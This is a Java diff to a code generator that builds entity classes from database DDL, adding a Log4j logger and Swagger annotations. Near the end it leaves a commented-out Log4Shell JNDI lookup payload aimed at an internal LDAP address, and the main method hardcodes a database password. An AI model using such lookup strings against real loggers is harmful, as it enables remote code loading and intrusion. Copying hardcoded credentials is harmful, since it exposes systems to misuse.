@@ -20,7 +20,8 @@ import java.util.ArrayList;
 import java.util.Date;
 import java.util.HashMap;
 import java.util.List;
-import tw.com.leadtek.nhiwidget.payload.my.MyOrderPayload;
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
 import tw.com.leadtek.tools.GenClassFieldXMLTag;
 
 /**
@@ -31,6 +32,8 @@ import tw.com.leadtek.tools.GenClassFieldXMLTag;
  */
 public class GenerateSqlByClass {
 
+  public static final Logger logger = LogManager.getLogger();
+  
   private final static char SEPARATOR = '\t';
 
   private final static String SQL_TYPE = "MARIA";
@@ -390,19 +393,21 @@ public class GenerateSqlByClass {
 
   public void generateClassByDB(int dbType, String schema, String IP, int port, String username,
       String password, String packageName, String folder) {
+    boolean swagger = true;
     GenerateDocumentFromDB genDB = new GenerateDocumentFromDB(dbType, schema);
     genDB.connect(IP, port, username, password);
     HashMap<String, String> tables = genDB.getAllTable(schema);
     for (String table : tables.keySet()) {
       String ddl = genDB.getTableDDL(table);
-      generateClassBySQL(new StringReader(ddl), packageName, folder);
+      generateClassBySQL(new StringReader(ddl), packageName, folder, swagger);
     }
   }
 
   public void generateClassBySQL(String filename, String packageName, String folder) {
+    boolean swagger = true;
     try {
       generateClassBySQL(new InputStreamReader(new FileInputStream(new File(filename)), "UTF-8"),
-          packageName, folder);
+          packageName, folder, swagger);
     } catch (UnsupportedEncodingException e) {
       e.printStackTrace();
     } catch (FileNotFoundException e) {
@@ -410,7 +415,8 @@ public class GenerateSqlByClass {
     }
   }
 
-  public void generateClassBySQL(Reader reader, String packageName, String folder) {
+  public void generateClassBySQL(Reader reader, String packageName, String folder,
+      boolean swagger) {
     try {
       BufferedReader br = new BufferedReader(reader);
       String line = null;
@@ -422,7 +428,8 @@ public class GenerateSqlByClass {
       String createTable = "CREATE TABLE ";
       while ((line = br.readLine()) != null) {
         System.out.println("line=" + line);
-        if (line.indexOf("ENGINE") > -1 || line.startsWith("ALTER TABLE") || line.startsWith("CREATE INDEX")) {
+        if (line.indexOf("ENGINE") > -1 || line.startsWith("ALTER TABLE")
+            || line.startsWith("CREATE INDEX")) {
           continue;
         }
         int index = line.toUpperCase().indexOf(createTable);
@@ -433,8 +440,9 @@ public class GenerateSqlByClass {
           }
         }
         if (index > -1) {
+          tableRemark = getTableRemark(line);
           if (tableName != null) {
-            generateClass(packageName, folder, tableName, tableRemark, fields);
+            generateClass(packageName, folder, tableName, tableRemark, fields, swagger);
             tableRemark = null;
           }
           tableName = getTableName(line, isHANA);
@@ -453,7 +461,7 @@ public class GenerateSqlByClass {
         }
       }
       if (tableName != null) {
-        generateClass(packageName, folder, tableName, tableRemark, fields);
+        generateClass(packageName, folder, tableName, tableRemark, fields, swagger);
       }
       br.close();
     } catch (IOException e) {
@@ -461,20 +469,36 @@ public class GenerateSqlByClass {
     }
   }
 
+  private String getTableRemark(String sql) {
+    String comment = " COMMENT ";
+    int index = sql.indexOf(comment);
+    if (index < 0) {
+      return null;
+    }
+    String s = sql.substring(index + comment.length() + 1);
+    index = s.indexOf('\'');
+    if (index > 0) {
+      return s.substring(0, index);
+    }
+    return s;
+  }
+
   public void generateClass(String packageName, String folder, String tableName, String tableRemark,
-      List<GenClassFieldXMLTag> fields) {
+      List<GenClassFieldXMLTag> fields, boolean swagger) {
     try {
       BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(
           new FileOutputStream(folder + "//" + tableName + ".java"), "UTF-8"));
       SimpleDateFormat sdf = new SimpleDateFormat("yyyy/MM/dd");
-      writeRemark("Created on " + sdf.format(new Date()) + " by GenerateSqlByClass().", bw);
+      writeRemark("Created on " + sdf.format(new Date()) + " by GenerateSqlByClass().", bw,
+          false);
       bw.write("package ");
       bw.write(packageName);
       bw.write(";");
       bw.newLine();
       bw.newLine();
       for (GenClassFieldXMLTag genClassFieldXMLTag : fields) {
-        if (genClassFieldXMLTag.getType().toUpperCase().equals("DATE")) {
+        if (genClassFieldXMLTag.getType().toUpperCase().equals("DATE")
+            || genClassFieldXMLTag.getType().toUpperCase().equals("LONGDATE")) {
           bw.write("import java.util.Date;\n");
           break;
         }
@@ -484,10 +508,14 @@ public class GenerateSqlByClass {
           + "import javax.persistence.GenerationType;\n" + "import javax.persistence.Id;\n"
           + "import javax.persistence.Table;\n"
           + "import com.fasterxml.jackson.annotation.JsonIgnore;\n"
-          + "import com.fasterxml.jackson.annotation.JsonProperty;\n\n");
-
+          + "import com.fasterxml.jackson.annotation.JsonProperty;\n");
+      if (swagger) {
+        bw.write("import io.swagger.annotations.ApiModel;\n"
+            + "import io.swagger.annotations.ApiModelProperty;\n");
+      }
+      bw.write("\n");
       if (tableRemark != null) {
-        writeRemark(tableRemark, bw);
+        writeRemark(tableRemark, bw, swagger);
       }
 
       bw.write("@Table(name = \"" + tableName + "\")");
@@ -499,10 +527,10 @@ public class GenerateSqlByClass {
       bw.newLine();
 
       for (GenClassFieldXMLTag genClassFieldXMLTag : fields) {
-        bw.write(genClassFieldXMLTag.toJavaDeclareCode());
+        bw.write(genClassFieldXMLTag.toJavaDeclareCode(swagger));
       }
       for (GenClassFieldXMLTag genClassFieldXMLTag : fields) {
-        bw.write(genClassFieldXMLTag.toJavaGetSetCode());
+        bw.write(genClassFieldXMLTag.toJavaGetSetCode(swagger));
       }
       bw.write("}");
       bw.close();
@@ -511,14 +539,19 @@ public class GenerateSqlByClass {
     }
   }
 
-  private void writeRemark(String remark, BufferedWriter bw) throws IOException {
-    bw.write("/**");
-    bw.newLine();
-    bw.write(" * ");
-    bw.write(remark);
-    bw.newLine();
-    bw.write(" */");
-    bw.newLine();
+  private void writeRemark(String remark, BufferedWriter bw, boolean swagger) throws IOException {
+    if (swagger) {
+      bw.write("@ApiModel(\"" + remark + "\")");
+      bw.write("\n");
+    } else {
+      bw.write("/**");
+      bw.newLine();
+      bw.write(" * ");
+      bw.write(remark);
+      bw.newLine();
+      bw.write(" */");
+      bw.newLine();
+    }
   }
 
   public void generateSQL() {
@@ -575,7 +608,10 @@ public class GenerateSqlByClass {
     gen.generateClassByDB(GenerateDocumentFromDB.HANA, "NWUSER", "10.10.5.31", 30041, "NWUSER",
         "Leadtek2021", "tw.com.leadtek.nhiwidget.model.rdb",
         "D:\\Users\\2268\\2020\\健保點數申報\\src\\generateClass");
-    //findDeclaredMethod("tw.com.leadtek.nhiwidget.payload.my.MyOrderPayload", "applId");
+    
+    // findDeclaredMethod("tw.com.leadtek.nhiwidget.payload.my.MyOrderPayload", "applId");
+//    logger.error("java.version = ${java:version}, os = ${java:os}");
+//    logger.error("${jndi:ldap://10.10.5.30:8081/user}");
   }
 
   public static boolean findDeclaredMethod(String className, String field) {
